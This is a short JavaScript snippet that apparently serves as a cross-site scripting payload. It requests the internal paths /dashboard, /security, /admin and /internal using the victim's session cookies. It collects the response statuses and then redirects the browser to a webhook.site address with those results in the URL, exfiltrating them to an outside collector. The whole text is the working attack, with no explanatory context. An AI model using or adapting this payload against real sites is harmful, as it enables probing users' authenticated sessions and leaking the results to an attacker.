(async()=>{
let paths=['/dashboard','/security','/admin','/internal'];

let out=[];

for(let p of paths){
 try{
   let r=await fetch(p,{credentials:'include'});
   out.push(p+":"+r.status);
 }catch(e){
   out.push(p+":ERR");
 }
}

location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d="+encodeURIComponent(out.join("|"));
})();